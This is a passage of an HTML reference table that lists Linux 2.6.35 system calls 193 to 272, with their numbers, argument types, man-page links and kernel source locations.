href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate64.2.html">sys_truncate64</a></td><td>0xc1</td><td>const char __user *path</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>194</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate64.2.html">sys_ftruncate64</a></td><td>0xc2</td><td>unsigned int fd</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>195</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stat64.2.html">sys_stat64</a></td><td>0xc3</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25">struct stat64 __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L358">fs&#x2F;stat.c:358</a></td></tr><tr><td>196</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lstat64.2.html">sys_lstat64</a></td><td>0xc4</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25">struct stat64 __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L369">fs&#x2F;stat.c:369</a></td></tr><tr><td>197</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstat64.2.html">sys_fstat64</a></td><td>0xc5</td><td>unsigned long fd</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25">struct stat64 __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L380">fs&#x2F;stat.c:380</a></td></tr><tr><td>198</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown.2.html">sys_lchown</a></td><td>0xc6</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L583">fs&#x2F;open.c:583</a></td></tr><tr><td>199</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid.2.html">sys_getuid</a></td><td>0xc7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1359">kernel&#x2F;timer.c:1359</a></td></tr><tr><td>200</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid.2.html">sys_getgid</a></td><td>0xc8</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1371">kernel&#x2F;timer.c:1371</a></td></tr><tr><td>201</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid.2.html">sys_geteuid</a></td><td>0xc9</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1365">kernel&#x2F;timer.c:1365</a></td></tr><tr><td>202</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid.2.html">sys_getegid</a></td><td>0xca</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1377">kernel&#x2F;timer.c:1377</a></td></tr><tr><td>203</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid.2.html">sys_setreuid</a></td><td>0xcb</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L594">kernel&#x2F;sys.c:594</a></td></tr><tr><td>204</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid.2.html">sys_setregid</a></td><td>0xcc</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L484">kernel&#x2F;sys.c:484</a></td></tr><tr><td>205</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups.2.html">sys_getgroups</a></td><td>0xcd</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/groups.c?v=2.6.35#L203">kernel&#x2F;groups.c:203</a></td></tr><tr><td>206</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups.2.html">sys_setgroups</a></td><td>0xce</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/groups.c?v=2.6.35#L232">kernel&#x2F;groups.c:232</a></td></tr><tr><td>207</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown.2.html">sys_fchown</a></td><td>0xcf</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L602">fs&#x2F;open.c:602</a></td></tr><tr><td>208</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid.2.html">sys_setresuid</a></td><td>0xd0</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L696">kernel&#x2F;sys.c:696</a></td></tr><tr><td>209</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid.2.html">sys_getresuid</a></td><td>0xd1</td><td>uid_t __user *ruid</td><td>uid_t __user *euid</td><td>uid_t __user *suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L746">kernel&#x2F;sys.c:746</a></td></tr><tr><td>210</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid.2.html">sys_setresgid</a></td><td>0xd2</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L761">kernel&#x2F;sys.c:761</a></td></tr><tr><td>211</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid.2.html">sys_getresgid</a></td><td>0xd3</td><td>gid_t __user *rgid</td><td>gid_t __user *egid</td><td>gid_t __user *sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L800">kernel&#x2F;sys.c:800</a></td></tr><tr><td>212</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown.2.html">sys_chown</a></td><td>0xd4</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L539">fs&#x2F;open.c:539</a></td></tr><tr><td>213</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid.2.html">sys_setuid</a></td><td>0xd5</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L655">kernel&#x2F;sys.c:655</a></td></tr><tr><td>214</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid.2.html">sys_setgid</a></td><td>0xd6</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L531">kernel&#x2F;sys.c:531</a></td></tr><tr><td>215</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid.2.html">sys_setfsuid</a></td><td>0xd7</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L819">kernel&#x2F;sys.c:819</a></td></tr><tr><td>216</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid.2.html">sys_setfsgid</a></td><td>0xd8</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L852">kernel&#x2F;sys.c:852</a></td></tr><tr><td>217</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pivot_root.2.html">sys_pivot_root</a></td><td>0xd9</td><td>const char __user *new_root</td><td>const char __user *put_old</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L2184">fs&#x2F;namespace.c:2184</a></td></tr><tr><td>218</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mincore.2.html">sys_mincore</a></td><td>0xda</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char __user * vec</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mincore.c?v=2.6.35#L256">mm&#x2F;mincore.c:256</a></td></tr><tr><td>219</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/madvise.2.html">sys_madvise</a></td><td>0xdb</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/madvise.c?v=2.6.35#L335">mm&#x2F;madvise.c:335</a></td></tr><tr><td>220</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html">sys_getdents64</a></td><td>0xdc</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/dirent.h?v=2.6.35#L4">struct linux_dirent64 __user *dirent</a></td><td>unsigned int count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L273">fs&#x2F;readdir.c:273</a></td></tr><tr><td>221</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl64.2.html">sys_fcntl64</a></td><td>0xdd</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L452">fs&#x2F;fcntl.c:452</a></td></tr><tr><td>222</td><td>not implemented</td><td>0xde</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>223</td><td>not implemented</td><td>0xdf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>224</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettid.2.html">sys_gettid</a></td><td>0xe0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1493">kernel&#x2F;timer.c:1493</a></td></tr><tr><td>225</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readahead.2.html">sys_readahead</a></td><td>0xe1</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>226</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setxattr.2.html">sys_setxattr</a></td><td>0xe2</td><td>const char __user *path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L279">fs&#x2F;xattr.c:279</a></td></tr><tr><td>227</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lsetxattr.2.html">sys_lsetxattr</a></td><td>0xe3</td><td>const char __user *path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L298">fs&#x2F;xattr.c:298</a></td></tr><tr><td>228</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsetxattr.2.html">sys_fsetxattr</a></td><td>0xe4</td><td>int fd</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L317">fs&#x2F;xattr.c:317</a></td></tr><tr><td>229</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getxattr.2.html">sys_getxattr</a></td><td>0xe5</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L376">fs&#x2F;xattr.c:376</a></td></tr><tr><td>230</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lgetxattr.2.html">sys_lgetxattr</a></td><td>0xe6</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L390">fs&#x2F;xattr.c:390</a></td></tr><tr><td>231</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fgetxattr.2.html">sys_fgetxattr</a></td><td>0xe7</td><td>int fd</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L404">fs&#x2F;xattr.c:404</a></td></tr><tr><td>232</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/listxattr.2.html">sys_listxattr</a></td><td>0xe8</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L449">fs&#x2F;xattr.c:449</a></td></tr><tr><td>233</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llistxattr.2.html">sys_llistxattr</a></td><td>0xe9</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L463">fs&#x2F;xattr.c:463</a></td></tr><tr><td>234</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flistxattr.2.html">sys_flistxattr</a></td><td>0xea</td><td>int fd</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L477">fs&#x2F;xattr.c:477</a></td></tr><tr><td>235</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/removexattr.2.html">sys_removexattr</a></td><td>0xeb</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L509">fs&#x2F;xattr.c:509</a></td></tr><tr><td>236</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lremovexattr.2.html">sys_lremovexattr</a></td><td>0xec</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L527">fs&#x2F;xattr.c:527</a></td></tr><tr><td>237</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fremovexattr.2.html">sys_fremovexattr</a></td><td>0xed</td><td>int fd</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L545">fs&#x2F;xattr.c:545</a></td></tr><tr><td>238</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tkill.2.html">sys_tkill</a></td><td>0xee</td><td>int pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2395">kernel&#x2F;signal.c:2395</a></td></tr><tr><td>239</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile64.2.html">sys_sendfile64</a></td><td>0xef</td><td>int out_fd</td><td>int in_fd</td><td>loff_t __user *offset</td><td>size_t count</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L916">fs&#x2F;read_write.c:916</a></td></tr><tr><td>240</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futex.2.html">sys_futex</a></td><td>0xf0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2605">kernel&#x2F;futex.c:2605</a></td></tr><tr><td>241</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setaffinity.2.html">sys_sched_setaffinity</a></td><td>0xf1</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4765">kernel&#x2F;sched.c:4765</a></td></tr><tr><td>242</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getaffinity.2.html">sys_sched_getaffinity</a></td><td>0xf2</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4817">kernel&#x2F;sched.c:4817</a></td></tr><tr><td>243</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_thread_area.2.html">sys_set_thread_area</a></td><td>0xf3</td><td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/ldt.h?v=2.6.35#L20">struct user_desc __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/kernel/syscall.c?v=2.6.35#L222">arch&#x2F;mips&#x2F;kernel&#x2F;syscall.c:222</a></td></tr><tr><td>244</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_thread_area.2.html">sys_get_thread_area</a></td><td>0xf4</td><td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/ldt.h?v=2.6.35#L20">struct user_desc __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>245</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_setup.2.html">sys_io_setup</a></td><td>0xf5</td><td>unsigned nr_reqs</td><td>aio_context_t __user *ctx</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1245">fs&#x2F;aio.c:1245</a></td></tr><tr><td>246</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_destroy.2.html">sys_io_destroy</a></td><td>0xf6</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1283">fs&#x2F;aio.c:1283</a></td></tr><tr><td>247</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_getevents.2.html">sys_io_getevents</a></td><td>0xf7</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td><a href="http://lxr.free-electrons.com/source/include/linux/aio_abi.h?v=2.6.35#L58">struct io_event __user *events</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *timeout</a></td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1808">fs&#x2F;aio.c:1808</a></td></tr><tr><td>248</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_submit.2.html">sys_io_submit</a></td><td>0xf8</td><td>aio_context_t</td><td>long</td><td>struct iocb __user * __user *</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1711">fs&#x2F;aio.c:1711</a></td></tr><tr><td>249</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_cancel.2.html">sys_io_cancel</a></td><td>0xf9</td><td>aio_context_t ctx_id</td><td>struct iocb __user *iocb</td><td><a href="http://lxr.free-electrons.com/source/include/linux/aio_abi.h?v=2.6.35#L58">struct io_event __user *result</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1746">fs&#x2F;aio.c:1746</a></td></tr><tr><td>250</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64.2.html">sys_fadvise64</a></td><td>0xfa</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>251</td><td>not implemented</td><td>0xfb</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>252</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit_group.2.html">sys_exit_group</a></td><td>0xfc</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1087">kernel&#x2F;exit.c:1087</a></td></tr><tr><td>253</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lookup_dcookie.2.html">sys_lookup_dcookie</a></td><td>0xfd</td><td>u64 cookie64</td><td>char __user *buf</td><td>size_t len</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>254</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create.2.html">sys_epoll_create</a></td><td>0xfe</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1215">fs&#x2F;eventpoll.c:1215</a></td></tr><tr><td>255</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_ctl.2.html">sys_epoll_ctl</a></td><td>0xff</td><td>int epfd</td><td>int op</td><td>int fd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/eventpoll.h?v=2.6.35#L47">struct epoll_event __user *event</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1228">fs&#x2F;eventpoll.c:1228</a></td></tr><tr><td>256</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_wait.2.html">sys_epoll_wait</a></td><td>0x100</td><td>int epfd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/eventpoll.h?v=2.6.35#L47">struct epoll_event __user *events</a></td><td>int maxevents</td><td>int timeout</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1320">fs&#x2F;eventpoll.c:1320</a></td></tr><tr><td>257</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/remap_file_pages.2.html">sys_remap_file_pages</a></td><td>0x101</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td><a href="http://lxr.free-electrons.com/source/mm/fremap.c?v=2.6.35#L123">mm&#x2F;fremap.c:123</a></td></tr><tr><td>258</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_tid_address.2.html">sys_set_tid_address</a></td><td>0x102</td><td>int __user *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/fork.c?v=2.6.35#L920">kernel&#x2F;fork.c:920</a></td></tr><tr><td>259</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_create.2.html">sys_timer_create</a></td><td>0x103</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/siginfo.h?v=2.6.35#L259">struct sigevent __user *timer_event_spec</a></td><td>timer_t __user * created_timer_id</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L522">kernel&#x2F;posix-timers.c:522</a></td></tr><tr><td>260</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_settime.2.html">sys_timer_settime</a></td><td>0x104</td><td>timer_t timer_id</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258">const struct itimerspec __user *new_setting</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258">struct itimerspec __user *old_setting</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L800">kernel&#x2F;posix-timers.c:800</a></td></tr><tr><td>261</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_gettime.2.html">sys_timer_gettime</a></td><td>0x105</td><td>timer_t timer_id</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258">struct itimerspec __user *setting</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L702">kernel&#x2F;posix-timers.c:702</a></td></tr><tr><td>262</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_getoverrun.2.html">sys_timer_getoverrun</a></td><td>0x106</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L732">kernel&#x2F;posix-timers.c:732</a></td></tr><tr><td>263</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_delete.2.html">sys_timer_delete</a></td><td>0x107</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L855">kernel&#x2F;posix-timers.c:855</a></td></tr><tr><td>264</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_settime.2.html">sys_clock_settime</a></td><td>0x108</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">const struct timespec __user *tp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L941">kernel&#x2F;posix-timers.c:941</a></td></tr><tr><td>265</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_gettime.2.html">sys_clock_gettime</a></td><td>0x109</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *tp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L954">kernel&#x2F;posix-timers.c:954</a></td></tr><tr><td>266</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_getres.2.html">sys_clock_getres</a></td><td>0x10a</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *tp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L971">kernel&#x2F;posix-timers.c:971</a></td></tr><tr><td>267</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_nanosleep.2.html">sys_clock_nanosleep</a></td><td>0x10b</td><td>clockid_t which_clock</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">const struct timespec __user *rqtp</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *rmtp</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L1001">kernel&#x2F;posix-timers.c:1001</a></td></tr><tr><td>268</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs64.2.html">sys_statfs64</a></td><td>0x10c</td><td>const char __user *path</td><td>size_t sz</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L63">struct statfs64 __user *buf</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L118">fs&#x2F;statfs.c:118</a></td></tr><tr><td>269</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs64.2.html">sys_fstatfs64</a></td><td>0x10d</td><td>unsigned int fd</td><td>size_t sz</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L63">struct statfs64 __user *buf</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L154">fs&#x2F;statfs.c:154</a></td></tr><tr><td>270</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tgkill.2.html">sys_tgkill</a></td><td>0x10e</td><td>int tgid</td><td>int pid</td><td>int sig</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2383">kernel&#x2F;signal.c:2383</a></td></tr><tr><td>271</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimes.2.html">sys_utimes</a></td><td>0x10f</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20">struct timeval __user *utimes</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L219">fs&#x2F;utimes.c:219</a></td></tr><tr><td>272</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64_64.2.html">sys_fadvise64_64</a></td><td>0x110</td><td>int fd</td><td>loff_t offset</td><td>loff_t len</td><td>int advice</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not 